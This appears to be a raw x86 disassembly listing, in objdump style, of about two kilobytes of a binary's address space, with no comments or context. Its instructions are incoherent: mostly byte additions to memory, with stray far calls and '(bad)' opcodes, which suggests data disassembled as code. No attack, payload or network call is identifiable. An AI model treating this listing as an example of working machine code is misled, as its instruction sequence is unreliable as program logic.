  4056aa:	and    BYTE PTR [edx+0x2],0x68
  4056ae:	adc    DWORD PTR [eax],ecx
  4056b0:	sbb    al,0x44
  4056b2:	add    BYTE PTR [eax],al
  4056b4:	add    BYTE PTR [eax],al
  4056b6:	push   ss
  4056b7:	aaa    
  4056b8:	sbb    eax,0x74040800
  4056bd:	mov    eax,ds:0x98060232
  4056c2:	add    al,0x8
  4056c4:	or     DWORD PTR [eax],ecx
  4056c6:	or     al,0x20
  4056c8:	or     DWORD PTR [eax],edx
  4056ca:	add    al,0x8
  4056cc:	inc    eax
  4056cd:	mov    dl,0x20
  4056cf:	rol    BYTE PTR [ecx],0x60
  4056d2:	add    BYTE PTR [eax],0x29
  4056d5:	add    BYTE PTR [eax-0x80],al
  4056d8:	rol    BYTE PTR [esp+eax*4+0x0],0x21
  4056dd:	adc    BYTE PTR [eax],al
  4056df:	sub    BYTE PTR [eax],al
  4056e1:	or     BYTE PTR [eax+0x54],0x0
  4056e5:	add    BYTE PTR [edx],cl
  4056e7:	add    BYTE PTR [edx],bl
  4056e9:	or     BYTE PTR [esi],al
  4056eb:	sbb    BYTE PTR [edi],dl
  4056ed:	add    BYTE PTR ds:0x800021,cl
  4056f3:	shl    BYTE PTR [eax+0x4a],0x0
  4056f7:	inc    eax
  4056f8:	and    al,0xd
  4056fa:	add    DWORD PTR [edx],0x2a
  4056fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056fe:	test   BYTE PTR [eax],dl
  405700:	adc    BYTE PTR [eax],ah
  405702:	add    eax,0x10a4241
  405707:	add    al,0x0
  405709:	or     BYTE PTR [eax+0x620c2],ch
  40570f:	and    DWORD PTR [eax-0x4d83f7c8],eax
  405715:	and    DWORD PTR [eax],0x0
  405718:	inc    eax
  405719:	adc    DWORD PTR [ecx-0x6f7ffdb4],0x845468
  405723:	add    BYTE PTR [edx+0x0],al
  405726:	xor    BYTE PTR [esi],dl
  405728:	inc    eax
  405729:	adc    BYTE PTR [eax+0x8090300],al
  40572f:	add    DWORD PTR [ecx],edx
  405731:	adc    ebp,ebp
  405733:	inc    esp
  405734:	inc    ecx
  405735:	and    BYTE PTR [eax],cl
  405737:	add    eax,0x40130a20
  40573c:	or     BYTE PTR [ebx+0x0],ch
  40573f:	add    BYTE PTR [eax+eax*4],al
  405742:	add    BYTE PTR [ecx+0x5c],al
  405745:	inc    esp
  405746:	inc    eax
  405747:	or     al,0x21
  405749:	inc    ecx
  40574a:	inc    eax
  40574b:	adc    BYTE PTR [ecx+0x2c],al
  40574e:	add    BYTE PTR [eax],ah
  405750:	ret    0x1142
  405753:	add    BYTE PTR [edx],ah
  405755:	and    BYTE PTR [eax+0x2],al
  405758:	add    BYTE PTR [edx],0xa8
  40575b:	add    al,BYTE PTR [eax]
  40575d:	and    dl,0xe
  405760:	add    BYTE PTR [eax],dl
  405762:	inc    edx
  405763:	test   al,al
  405765:	and    BYTE PTR [eax+0x54],al
  405768:	mov    BYTE PTR [eax],ah
  40576a:	and    BYTE PTR [eax],cl
  40576c:	xor    eax,0x21004800
  405771:	add    BYTE PTR [eax],ah
  405773:	push   0x8
  405775:	inc    ebp
  405776:	add    BYTE PTR [eax],ah
  405778:	inc    edx
  405779:	add    BYTE PTR [eax],al
  40577b:	dec    esp
  40577c:	inc    esp
  40577d:	xchg   ecx,eax
  40577e:	pop    es
  40577f:	xchg   ebp,eax
  405780:	or     al,0x0
  405782:	imul   esp,DWORD PTR [eax],0x41080c01
  405788:	inc    eax
  405789:	push   edx
  40578a:	add    BYTE PTR [edx-0x5e],al
  40578d:	add    DWORD PTR [edx],edx
  40578f:	cwde   
  405790:	add    BYTE PTR [edx],ah
  405792:	mov    eax,ds:0x5d28242d
  405797:	inc    edx
  405798:	add    BYTE PTR [esp+edx*1],ah
  40579b:	mov    WORD PTR [eax],es
  40579d:	inc    eax
  40579e:	inc    edx
  40579f:	sub    al,al
  4057a1:	mov    BYTE PTR [ecx],al
  4057a3:	fs add al,0x42
  4057a6:	push   eax
  4057a7:	or     al,0x48
  4057a9:	push   edx
  4057aa:	inc    eax
  4057ab:	lock and BYTE PTR [eax],0x81
  4057af:	or     BYTE PTR [ecx],al
  4057b1:	add    DWORD PTR [edx+eax*2],esi
  4057b4:	add    BYTE PTR [edx+0x23],al
  4057b7:	nop
  4057b8:	add    al,BYTE PTR [ecx]
  4057ba:	add    al,0x0
  4057bc:	loopne 0x40581e
  4057be:	and    al,BYTE PTR [edx+eax*2-0x2e]
  4057c2:	add    ch,al
  4057c4:	add    BYTE PTR [eax],cl
  4057c6:	add    al,0x67
  4057c8:	add    bl,BYTE PTR [eax-0x7cffae00]
  4057ce:	sub    BYTE PTR [ecx],al
  4057d0:	add    BYTE PTR [eax],cl
  4057d2:	adc    DWORD PTR [eax+eax*4+0x22015394],eax
  4057d9:	mov    al,ds:0x3400048
  4057de:	add    BYTE PTR [eax],al
  4057e0:	adc    al,BYTE PTR [edx+eax*1]
  4057e3:	sbb    al,BYTE PTR [edx]
  4057e5:	inc    edx
  4057e6:	add    BYTE PTR [eax],al
  4057e8:	add    al,0x0
  4057ea:	ret    0x2004
  4057ed:	and    BYTE PTR [eax+eiz*1+0x0],cl
  4057f1:	add    BYTE PTR [eax],0x41
  4057f4:	or     al,0x40
  4057f6:	add    dl,BYTE PTR [esi+0x488601]
  4057fc:	mov    al,ds:0x7020a002
  405801:	or     BYTE PTR [eax],al
  405803:	add    al,BYTE PTR [eax]
  405805:	adc    BYTE PTR [esi],0x10
  405808:	add    BYTE PTR [eax],al
  40580a:	sub    BYTE PTR [eax],al
  40580c:	adc    BYTE PTR [ecx+0x14200008],al
  405812:	add    BYTE PTR [eax-0x80],al
  405815:	add    BYTE PTR [eax],cl
  405817:	add    ecx,DWORD PTR [edx]
  405819:	sbb    BYTE PTR [eax+0x200118c3],al
  40581f:	add    al,BYTE PTR [eax]
  405821:	and    ebx,DWORD PTR [edx]
  405823:	add    BYTE PTR [esp+eax*1],al
  405826:	push   eax
  405827:	sbb    al,0x46
  405829:	and    al,BYTE PTR [eax+0x40000410]
  40582f:	add    BYTE PTR [edx+0x2],ah
  405832:	add    esp,DWORD PTR [esp+eax*1+0x544b000]
  405839:	sub    ah,BYTE PTR [edx+0x61030008]
  40583f:	or     BYTE PTR [ecx-0x7f6f7c00],al
  405845:	add    al,0x83
  405847:	add    DWORD PTR [eax],eax
  405849:	xor    BYTE PTR [ebx],cl
  40584b:	add    ah,BYTE PTR [eax+0x0]
  40584e:	inc    edx
  40584f:	push   eax
  405850:	inc    edx
  405851:	or     BYTE PTR [ecx+ecx*4],al
  405854:	xor    BYTE PTR [eax],al
  405856:	sub    al,0x0
  405858:	and    al,0x20
  40585a:	or     DWORD PTR [eax],eax
  40585c:	adc    BYTE PTR [eax+0x5d],al
  40585f:	inc    eax
  405860:	inc    esi
  405861:	add    al,0x0
  405863:	mov    BYTE PTR [edx],al
  405865:	add    BYTE PTR [ecx+0x21],al
  405868:	or     BYTE PTR [edx+0x40d08101],al
  40586e:	add    BYTE PTR [edx-0x3ffbffc8],ah
  405874:	loopne 0x40580a
  405876:	add    BYTE PTR [eax+ecx*2],dh
  405879:	add    BYTE PTR [eax+0x0],al
  40587c:	or     al,0x4
  40587e:	or     BYTE PTR [eax],al
  405880:	test   BYTE PTR [eax],0x42
  405883:	sbb    BYTE PTR [edx+0x801840],cl
  405889:	add    BYTE PTR [edx+0x210804ec],al
  40588f:	sub    BYTE PTR [eax],al
  405891:	inc    eax
  405892:	and    BYTE PTR [eax+ebp*2+0x2006024],0x9
  40589a:	add    al,0x0
  40589c:	add    BYTE PTR [ecx+0x1],0x12
  4058a0:	add    BYTE PTR [edx+0x244c],0x61
  4058a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058a8:	sbb    al,BYTE PTR [ecx+0x41]
  4058ab:	adc    dl,BYTE PTR [esi]
  4058ad:	adc    al,BYTE PTR [edx+0x7040220]
  4058b3:	add    esp,eax
  4058b5:	and    BYTE PTR [eax+ecx*4+0x0],cl
  4058b9:	or     BYTE PTR [eax],dl
  4058bb:	test   BYTE PTR [eax],ah
  4058bd:	add    BYTE PTR [edx],0x0
  4058c0:	nop
  4058c1:	pop    eax
  4058c2:	adc    al,0x4
  4058c4:	add    BYTE PTR [edx+0x26001705],0x20
  4058cb:	add    BYTE PTR [eax],al
  4058cd:	and    BYTE PTR [eax],al
  4058cf:	and    BYTE PTR [eax],al
  4058d1:	add    BYTE PTR [eax],al
  4058d3:	add    BYTE PTR [ecx],dh
  4058d5:	rcl    WORD PTR [ecx+eax*2],0x1
  4058da:	mov    cl,0x80
  4058dc:	ror    BYTE PTR [esi],0x2
  4058df:	add    al,al
  4058e1:	sbb    BYTE PTR [edx+0x6602d842],0x4a
  4058e8:	or     al,0x5
  4058ea:	nop
  4058eb:	or     DWORD PTR [eax+0x2500241a],ecx
  4058f1:	add    BYTE PTR [ecx+ecx*4+0x2003102a],al
  4058f8:	add    BYTE PTR [edi+eax*1+0xa108810],ah
  4058ff:	and    al,0x4
  405901:	adc    dl,BYTE PTR [eax]
  405903:	xchg   esp,eax
  405904:	sub    DWORD PTR [ebx+ebp*1],eax
  405907:	add    al,0x2
  405909:	test   BYTE PTR [edx],al
  40590b:	add    BYTE PTR [eax],al
  40590d:	and    BYTE PTR [ebp+0x78],bl
  405910:	adc    ah,BYTE PTR [eax]
  405912:	in     al,0xa0
  405914:	add    BYTE PTR [eax],ah
  405916:	rol    DWORD PTR [eax],1
  405918:	add    al,BYTE PTR [eax+0x21a4d4a0]
  40591e:	or     al,0x0
  405920:	add    al,BYTE PTR [eax+eax*4]
  405923:	or     al,BYTE PTR [eax]
  405925:	or     BYTE PTR [eax],cl
  405927:	in     al,0x0
  405929:	test   BYTE PTR [eax],al
  40592b:	add    al,0x21
  40592d:	and    al,BYTE PTR [eax+0xb000620]
  405933:	mov    BYTE PTR [ecx+0x14],al
  405936:	sub    eax,0x8000900
  40593b:	or     BYTE PTR [eax+0x3100b000],al
  405941:	add    ah,BYTE PTR [ebx+ebp*1]
  405944:	adc    cl,BYTE PTR [ebx]
  405946:	xor    BYTE PTR [ecx+0x10],dl
  405949:	adc    al,0x5
  40594b:	add    BYTE PTR [eax],al
  40594d:	add    al,0x80
  40594f:	aam    0x2
  405951:	sbb    al,0x40
  405953:	sbb    DWORD PTR [edx-0x6f],eax
  405956:	pop    eax
  405957:	add    eax,0x10842608
  40595c:	push   esp
  40595d:	push   eax
  40595e:	push   ecx
  40595f:	and    BYTE PTR [edx+0x61],0xa
  405963:	es dec esp
  405965:	xchg   esp,eax
  405966:	add    al,0x28
  405968:	mov    ch,0xc0
  40596a:	and    DWORD PTR [eax],edx
  40596c:	add    BYTE PTR [eax+0x30090410],dh
  405972:	push   ecx
  405973:	and    BYTE PTR [edx],al
  405975:	sbb    al,al
  405977:	add    BYTE PTR [eax+0x34],0x0
  40597b:	add    BYTE PTR [eax],al
  40597d:	add    BYTE PTR [eax-0x70],al
  405980:	adc    BYTE PTR [eax+eax*1],0x0
  405984:	xor    BYTE PTR [edx+0x1040a084],dl
  40598a:	add    edi,ebx
  40598c:	ret    0x4004
  40598f:	add    al,0x4
  405991:	add    al,0x0
  405993:	and    BYTE PTR [esp+ecx*1-0x60],al
  405997:	xor    al,BYTE PTR [edx+0x8]
  40599a:	or     al,0x40
  40599c:	add    al,BYTE PTR [ecx]
  40599e:	add    al,BYTE PTR [esp+eax*8]
  4059a1:	and    BYTE PTR [eax],al
  4059a3:	add    BYTE PTR [ebp+0x40],cl
  4059a6:	add    BYTE PTR [eax],al
  4059a8:	enter  0x12,0x41
  4059ac:	add    BYTE PTR [eax],ah
  4059ae:	add    BYTE PTR [eax+eax*4+0x250203],dl
  4059b5:	add    BYTE PTR [eax+eax*4],al
  4059b8:	add    al,0x31
  4059ba:	or     BYTE PTR [esi],0x53
  4059bd:	add    BYTE PTR [ecx],0x92
  4059c0:	loop   0x4059fd
  4059c2:	push   cs
  4059c3:	adc    al,0x22
  4059c5:	add    DWORD PTR [eax],0x1c210000
  4059cb:	sub    al,0xb2
  4059cd:	add    DWORD PTR [eax+eax*1],ebp
  4059d0:	test   BYTE PTR [edx+0xa0d310],al
  4059d6:	pushf  
  4059d7:	sub    BYTE PTR [ecx+0x100000],ah
  4059dd:	add    DWORD PTR [eax],eax
  4059df:	inc    esp
  4059e0:	inc    eax
  4059e1:	add    BYTE PTR [edx+ecx*2],dl
  4059e4:	and    BYTE PTR [eax+0x0],al
  4059e7:	push   es
  4059e8:	adc    BYTE PTR [eax],al
  4059ea:	inc    esp
  4059eb:	inc    esp
  4059ec:	add    DWORD PTR [eax+0x6006100],eax
  4059f2:	inc    eax
  4059f3:	dec    esp
  4059f4:	mov    BYTE PTR [eax+0x21247],al
  4059fa:	or     al,0x60
  4059fc:	or     BYTE PTR [esi],0x0
  4059ff:	xchg   ebp,eax
  405a00:	add    BYTE PTR [eax],al
  405a02:	add    BYTE PTR [edx],dl
  405a04:	adc    al,0x21
  405a06:	add    BYTE PTR [eax+edx*4+0x0],dl
  405a0a:	add    ah,BYTE PTR [eax]
  405a0c:	add    BYTE PTR [eax+0x0],al
  405a0f:	sbb    BYTE PTR [eax],cl
  405a11:	mov    BYTE PTR [esi+0x4],al
  405a14:	inc    eax
  405a15:	inc    eax
  405a16:	add    BYTE PTR [ecx],0xc0
  405a19:	mov    al,al
  405a1b:	xor    eax,0xc3384204
  405a20:	add    BYTE PTR [eax+edx*1],0x82
  405a24:	push   eax
  405a25:	sub    BYTE PTR [eax+0x9],al
  405a28:	inc    eax
  405a29:	add    BYTE PTR es:[edx],ah
  405a2c:	adc    BYTE PTR [eax],cl
  405a2e:	add    BYTE PTR [eax],ah
  405a30:	add    cl,BYTE PTR [edx]
  405a32:	adc    eax,DWORD PTR [ebx]
  405a34:	add    BYTE PTR [eax],al
  405a36:	inc    ecx
  405a37:	add    BYTE PTR [eax],bl
  405a39:	xchg   ecx,eax
  405a3a:	add    dl,BYTE PTR [eax]
  405a3c:	add    eax,0xf8a10f92
  405a41:	or     DWORD PTR [eax],eax
  405a43:	dec    ebp
  405a44:	xchg   edx,eax
  405a45:	add    al,BYTE PTR [edx]
  405a47:	nop
  405a48:	cwde   
  405a49:	add    BYTE PTR [ecx],al
  405a4b:	add    BYTE PTR [eax],ah
  405a4d:	add    dl,BYTE PTR [eax]
  405a4f:	adc    DWORD PTR [eax-0x3ffff6d6],eax
  405a55:	xor    BYTE PTR [ecx],ah
  405a57:	and    BYTE PTR [edx],al
  405a59:	and    BYTE PTR [ecx],al
  405a5b:	push   esp
  405a5c:	add    BYTE PTR [eax],ah
  405a5e:	or     BYTE PTR [ecx+0x2007d452],0x55
  405a65:	adc    DWORD PTR [eax-0x2b],eax
  405a68:	add    al,0x48
  405a6a:	sub    al,BYTE PTR [eax+eax*1+0x48]
  405a6e:	add    BYTE PTR [esi],al
  405a70:	and    BYTE PTR [eax],al
  405a72:	and    al,BYTE PTR [eax]
  405a74:	add    DWORD PTR [eax+0x10100281],esp
  405a7a:	iret   
  405a7b:	rol    BYTE PTR [ecx],0x1
  405a7e:	add    al,BYTE PTR [edx+0x12]
  405a81:	add    dl,dl
  405a83:	inc    ecx
  405a84:	add    BYTE PTR [edx],al
  405a86:	add    BYTE PTR [ecx],dl
  405a88:	mov    al,ds:0x2820082
  405a8d:	and    BYTE PTR [ebx+0x200a8028],0x23
  405a94:	and    BYTE PTR [eax],ah
  405a96:	add    ecx,DWORD PTR [edx+0x54]
  405a99:	add    BYTE PTR [esi],al
  405a9b:	or     BYTE PTR [ecx+0xc],cl
  405a9e:	and    BYTE PTR [edx],al
  405aa0:	popa   
  405aa1:	adc    ecx,DWORD PTR [eax]
  405aa3:	lea    ecx,[eax+eax*1+0x60b401]
  405aaa:	ret    0x4e24
  405aad:	add    al,BYTE PTR [edx]
  405aaf:	inc    ecx
  405ab0:	enter  0x400,0x1
  405ab4:	mov    eax,0xb01b1
  405ab9:	and    BYTE PTR [eax],0x80
  405abc:	mov    BYTE PTR [eax+eax*1-0x5f],0x0
  405ac1:	and    BYTE PTR [eax+0x2],al
  405ac4:	add    BYTE PTR [edx+0x4],al
  405ac7:	add    BYTE PTR [eax],dl
  405ac9:	push   eax
  405aca:	add    BYTE PTR [eax],ah
  405acc:	or     DWORD PTR [eax+esi*1],ecx
  405acf:	or     al,dl
  405ad1:	mov    BYTE PTR [eax],al
  405ad3:	add    BYTE PTR [eax],al
  405ad5:	sub    al,0xd0
  405ad7:	adc    BYTE PTR [ecx],dl
  405ad9:	and    BYTE PTR [eax],ah
  405adb:	add    DWORD PTR [eax],esp
  405add:	inc    edx
  405ade:	add    BYTE PTR [esi],bl
  405ae0:	add    BYTE PTR [ecx],al
  405ae2:	add    al,BYTE PTR [ecx+0x10105c02]
  405ae8:	dec    ecx
  405ae9:	adc    BYTE PTR [eax],al
  405aeb:	mov    BYTE PTR [edx+0x0],al
  405aee:	inc    eax
  405aef:	inc    edx
  405af0:	or     BYTE PTR [eax+0x31208836],al
  405af6:	push   es
  405af7:	add    BYTE PTR [edx],0x0
  405afa:	add    BYTE PTR [edx],al
  405afc:	mov    DWORD PTR [edx],esi
  405afe:	call   0x8015:0xc05000
  405b05:	and    BYTE PTR [edx+esi*1+0x404000],bh
  405b0c:	mov    bl,0x0
  405b0e:	ret    
  405b0f:	add    BYTE PTR [eax],al
  405b11:	add    BYTE PTR [eax+0x40010100],dl
  405b17:	add    al,0x4
  405b19:	loopne 0x405b3d
  405b1b:	push   es
  405b1c:	xchg   ebx,eax
  405b1d:	push   cs
  405b1e:	add    BYTE PTR [eax],al
  405b20:	add    BYTE PTR [eax],dh
  405b22:	add    BYTE PTR [eax],al
  405b24:	adc    al,BYTE PTR [eax]
  405b26:	add    ah,BYTE PTR [eax+edi*1]
  405b29:	into   
  405b2a:	add    DWORD PTR [eax],ebp
  405b2c:	inc    esp
  405b2d:	add    dl,BYTE PTR [eax+0x13121200]
  405b33:	push   es
  405b34:	or     BYTE PTR [eax],0x0
  405b37:	sbb    al,BYTE PTR [edx+0x4]
  405b3a:	adc    BYTE PTR [eax+ecx*8+0x2c490],dh
  405b41:	adc    al,0x77
  405b43:	add    BYTE PTR [eax+0x0],cl
  405b46:	add    BYTE PTR [ecx],ah
  405b48:	add    al,BYTE PTR [eax]
  405b4a:	or     BYTE PTR [eax],al
  405b4c:	inc    ebp
  405b4d:	xor    edx,esi
  405b4f:	inc    esp
  405b50:	inc    eax
  405b51:	add    BYTE PTR [eax],dl
  405b53:	push   0x2
  405b55:	add    BYTE PTR [eax],al
  405b57:	add    BYTE PTR [edx],0x10
  405b5a:	add    BYTE PTR [eax+0x22],bl
  405b5d:	dec    eax
  405b5e:	adc    ch,BYTE PTR [edx+0x3400008]
  405b64:	xor    BYTE PTR [eax+0x24824108],al
  405b6a:	and    ah,BYTE PTR [eax+0x0]
  405b6d:	ror    BYTE PTR [eax+0x801c024],0xc0
  405b74:	add    BYTE PTR [eax],ah
  405b76:	add    eax,0x22400010
  405b7b:	add    BYTE PTR [eax-0x40],bl
  405b7e:	push   esp
  405b7f:	sbb    al,BYTE PTR [edx]
  405b81:	and    BYTE PTR [eax+0x4],cl
  405b84:	add    BYTE PTR [eax],cl
  405b86:	add    BYTE PTR [eax],ch
  405b88:	mov    al,ds:0x20008010
  405b8d:	loopne 0x405b4f
  405b8f:	and    eax,0x6908b000
  405b94:	bound  eax,QWORD PTR [eax+eiz*1+0x20]
  405b98:	add    BYTE PTR [eax+0x20],0x26
  405b9c:	mov    ds:0xb2600140,al
  405ba1:	add    BYTE PTR [eax],al
  405ba3:	ror    BYTE PTR [edx],0xa
  405ba6:	sub    eax,0x10208210
  405bab:	sub    dl,ah
  405bad:	push   esi
  405bae:	add    al,0x96
  405bb0:	add    BYTE PTR [esp+ecx*4],dl
  405bb3:	dec    ecx
  405bb4:	inc    edx
  405bb5:	or     BYTE PTR [ebx+0x40000848],ah
  405bbb:	or     al,0xf
  405bbd:	adc    al,0x0
  405bbf:	add    BYTE PTR [eax+eax*8],ah
  405bc2:	and    BYTE PTR [edx+0x2],ah
  405bc5:	inc    edx
  405bc6:	test   DWORD PTR [edx+0x2144062c],esp
  405bcc:	add    BYTE PTR [eax],al
  405bce:	sbb    al,0x0
  405bd0:	add    al,BYTE PTR [esi]
  405bd2:	dec    eax
  405bd3:	adc    BYTE PTR [esi+0x2000400],0x8
  405bda:	add    al,0x0
  405bdc:	add    DWORD PTR [edx],eax
  405bde:	add    BYTE PTR [eax+eax*1],ah
  405be1:	add    al,0x90
  405be3:	and    DWORD PTR [eax+0x41a0280],ecx
  405be9:	xor    BYTE PTR [ebx+edx*2+0x90008],ah
  405bf0:	add    BYTE PTR [edx+0x5],0x10
  405bf4:	add    BYTE PTR [ebp+0x34],cl
  405bf7:	or     BYTE PTR [esp+eax*1],al
  405bfa:	xor    al,0xd
  405bfc:	or     BYTE PTR [edx+eax*2+0x10],dl
  405c00:	and    al,0x24
  405c02:	or     BYTE PTR [edx],ch
  405c04:	or     DWORD PTR [eax],eax
  405c06:	add    BYTE PTR [eax],ah
  405c08:	add    BYTE PTR [edx+0x4099210],0x0
  405c0f:	add    BYTE PTR [edx+ebx*2+0x2],al
  405c13:	in     al,0x40
  405c15:	or     BYTE PTR [eax],dl
  405c17:	test   al,0x72
  405c19:	add    BYTE PTR [eax+0x20],al
  405c1c:	inc    eax
  405c1d:	dec    ecx
  405c1e:	and    BYTE PTR [ecx],al
  405c20:	adc    BYTE PTR [eax+0xc002884],dl
  405c26:	inc    ecx
  405c27:	pop    eax
  405c28:	adc    al,0x54
  405c2a:	call   0xa041a06f
  405c2f:	nop
  405c30:	rcr    BYTE PTR [edx],1
  405c32:	add    DWORD PTR [eax],eax
  405c34:	add    al,0xa
  405c36:	adc    BYTE PTR [ebp+0x10010000],al
  405c3c:	add    BYTE PTR [eax+0x103b0800],al
  405c42:	sub    DWORD PTR [ecx],edx
  405c44:	mov    BYTE PTR [eax-0x80],al
  405c47:	add    al,0x3
  405c49:	add    al,0x80
  405c4b:	add    al,BYTE PTR [edx]
  405c4d:	add    BYTE PTR [edx],dl
  405c4f:	dec    eax
  405c50:	popf   
  405c51:	inc    eax
  405c52:	call   0x5202:0x1080080
  405c59:	inc    eax
  405c5a:	add    bl,BYTE PTR [eax+0x2]
  405c5d:	add    DWORD PTR [ecx+edx*4],eax
  405c60:	add    DWORD PTR [eax],eax
  405c62:	mov    BYTE PTR [esi],dl
  405c64:	inc    eax
  405c65:	add    DWORD PTR [ebx],0xb
  405c68:	add    BYTE PTR [ecx+0x40a24400],cl
  405c6e:	dec    ebx
  405c6f:	ror    BYTE PTR [ebx],1
  405c71:	or     BYTE PTR [ecx],dl
  405c73:	or     BYTE PTR [edx],0x2
  405c76:	mov    ds:0x480042,al
  405c7b:	add    al,0x40
  405c7d:	and    BYTE PTR [edx+0x55],al
  405c80:	(bad)  
  405c82:	add    BYTE PTR [edx],al
  405c84:	call   0x20605fcb
  405c89:	add    al,0x0
  405c8b:	push   es
  405c8c:	add    al,0x6
  405c8e:	(bad)  
  405c8f:	mov    al,0x70
  405c91:	push   edx
  405c92:	pusha  
  405c93:	adc    BYTE PTR [edx+0xc],al
  405c96:	xor    BYTE PTR [eax],al
  405c98:	and    BYTE PTR [ecx],dl
  405c9a:	add    BYTE PTR [eax],ch
  405c9c:	or     BYTE PTR [ecx+0x6b00004e],al
  405ca2:	add    ecx,DWORD PTR [edx+0x5080a0a]
  405ca8:	or     eax,DWORD PTR [ebx]
  405caa:	mov    dh,0x23
  405cac:	push   ebp
  405cad:	and    BYTE PTR [esi+0x10000e01],0x72
  405cb4:	sub    BYTE PTR [eax-0x77],0xca
  405cb8:	add    BYTE PTR [eax],0x20
  405cbb:	add    BYTE PTR [eax],al
  405cbd:	inc    edx
  405cbe:	add    BYTE PTR [eax],0x64
  405cc1:	add    BYTE PTR [edx],al
  405cc3:	test   DWORD PTR [eax],eax
  405cc5:	add    BYTE PTR ds:0x1c009822,al
  405ccb:	add    al,dh
  405ccd:	add    BYTE PTR [esi],ah
  405ccf:	les    ebx,FWORD PTR [eax]
  405cd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cd2:	or     BYTE PTR [eax+esi*1+0x2],dh
  405cd6:	data16 add BYTE PTR [eax+eax*2+0x404819],ch
  405cde:	add    DWORD PTR [eax],eax
  405ce0:	nop
  405ce1:	adc    BYTE PTR [eax+eiz*1],cl
  405ce4:	adc    al,0x0
  405ce6:	add    BYTE PTR [eax],al
  405ce8:	add    BYTE PTR [eax],dl
  405cea:	xor    BYTE PTR [ecx],dl
  405cec:	and    DWORD PTR [eax],eax
  405cee:	add    DWORD PTR [edx],ecx
  405cf0:	ret    0x7810
  405cf3:	add    BYTE PTR [eax+0x21],al
  405cf6:	add    BYTE PTR [ecx],dl
  405cf8:	add    BYTE PTR [eax+0x40],al
  405cfb:	mov    WORD PTR [eax],fs
  405cfd:	adc    BYTE PTR [eax+0x4010c048],ah
  405d03:	and    BYTE PTR [eax],ah
  405d05:	sbb    BYTE PTR ds:0x41020020,al
  405d0b:	mov    ds:0x68400d00,al
  405d10:	adc    BYTE PTR [ecx+0x4a008],0x84
  405d17:	inc    ebx
  405d18:	add    BYTE PTR [edx-0x40],al
  405d1b:	inc    esp
  405d1c:	add    BYTE PTR [eax+0x8010010],al
  405d22:	add    BYTE PTR [edx],al
  405d24:	add    BYTE PTR [edx+eax*1],al
  405d27:	push   0x80000280
  405d2c:	add    dl,BYTE PTR [eax]
  405d2e:	and    eax,0xa140b081
  405d33:	add    al,0x60
  405d35:	adc    BYTE PTR [eax+0x0],al
  405d38:	and    BYTE PTR [edx-0x58],al
  405d3b:	add    BYTE PTR [eax+eax*2+0x4d],0x19
  405d40:	sbb    eax,0x4a095100
  405d45:	xor    BYTE PTR [ecx],bl
  405d47:	add    al,0x3
  405d49:	adc    DWORD PTR [eax+ebx*1+0x405144c1],ecx
  405d50:	inc    ecx
  405d51:	pop    es
  405d52:	add    DWORD PTR [ebx],esi
  405d54:	mov    al,0x4
  405d56:	adc    DWORD PTR [eax-0x1c],eax
  405d59:	loopne 0x405d5b
  405d5b:	add    BYTE PTR [eax+0x1c],dl
  405d5e:	add    BYTE PTR [eax],al
  405d60:	and    al,BYTE PTR [edx]
  405d62:	adc    BYTE PTR [eax+0x40230ee1],ah
  405d68:	or     BYTE PTR [edx+0x48237000],cl
  405d6e:	and    eax,0x42007420
  405d74:	add    BYTE PTR [eax],cl
  405d76:	xor    al,dl
  405d78:	sub    BYTE PTR [eax],al
  405d7a:	popa   
  405d7b:	and    BYTE PTR [eax],al
  405d7d:	inc    eax
  405d7e:	mov    al,0x0
  405d80:	add    BYTE PTR [eax],al
  405d82:	adc    al,BYTE PTR [eax+0x0]
  405d85:	adc    BYTE PTR [ecx],al
  405d87:	inc    esi
  405d88:	add    DWORD PTR [edx],eax
  405d8a:	push   eax
  405d8b:	add    BYTE PTR [eax+ecx*1-0x4f],ah
  405d8f:	add    ah,BYTE PTR [edx+0x5c]
  405d92:	add    ah,BYTE PTR [eax+eax*1]
  405d95:	add    BYTE PTR [eax],ah
  405d97:	and    BYTE PTR [eax],bl
  405d99:	lods   al,BYTE PTR ds:[esi]
  405d9a:	adc    BYTE PTR [eax],0x84
  405d9d:	adc    BYTE PTR [eax],0x80
  405da0:	or     BYTE PTR [esi],0x10
  405da3:	push   ss
  405da4:	inc    esp
  405da5:	pop    eax
  405da6:	push   esp
  405da7:	adc    BYTE PTR [edx],cl
  405da9:	mov    al,ds:0xc6a200d5
  405dae:	xor    BYTE PTR [eax],al
  405db0:	add    BYTE PTR [eax],al
  405db2:	inc    esp
  405db3:	push   eax
  405db4:	lods   al,BYTE PTR ds:[esi]
  405db5:	add    BYTE PTR [eax],al
  405db7:	add    BYTE PTR [eax],al
  405db9:	call   0x40ecddbe
  405dbe:	mov    dl,bl
  405dc0:	add    dl,ch
  405dc2:	add    cl,ch
  405dc4:	dec    esp
  405dc5:	adc    al,0x18
  405dc7:	adc    BYTE PTR [eax],al
  405dc9:	or     al,0x6
  405dcb:	jecxz  0x405dd6
  405dcd:	inc    eax
  405dce:	or     DWORD PTR [eax+0xa044405],0x80800480
  405dd8:	or     al,BYTE PTR [eax]
  405dda:	push   ebp
  405ddb:	test   al,0xe4
  405ddd:	add    BYTE PTR [eax],al
  405ddf:	inc    edx
  405de0:	add    BYTE PTR [ecx+0x11],ah
  405de3:	add    eax,0x2000c48
  405de8:	inc    eax
  405de9:	inc    esi
  405dea:	add    BYTE PTR [edx-0x7c],0x30
  405dee:	add    BYTE PTR [ecx+0x0],cl
  405df1:	add    al,0x60
  405df3:	mov    ds:0x490cc165,al
  405df8:	push   es
  405df9:	add    BYTE PTR [ebx],al
  405dfb:	add    BYTE PTR [eax],al
  405dfd:	add    BYTE PTR [eax],0x0
  405e00:	mov    dl,BYTE PTR [eax]
  405e02:	add    BYTE PTR [eax],0x1
  405e05:	lock add BYTE PTR [eax],al
  405e08:	add    BYTE PTR [edx+0x201021],cl
  405e0e:	imul   eax,DWORD PTR [eax],0x84140203
  405e14:	mov    al,ds:0x40404120
  405e19:	rcl    DWORD PTR [eax+eax*1],0xaa
  405e1d:	jmp    0x404d:0x2020200
  405e24:	inc    eax
  405e25:	add    BYTE PTR [eax+ecx*1],dl
  405e28:	add    al,0x2
  405e2a:	sub    DWORD PTR [eax+0x41],eax
  405e2d:	add    BYTE PTR [eax-0x60],al
  405e30:	mov    BYTE PTR [edx+0x4],al
  405e33:	adc    BYTE PTR [eax+0x60006680],dh
  405e39:	inc    eax
  405e3a:	add    BYTE PTR [ecx],al
  405e3c:	inc    ebx
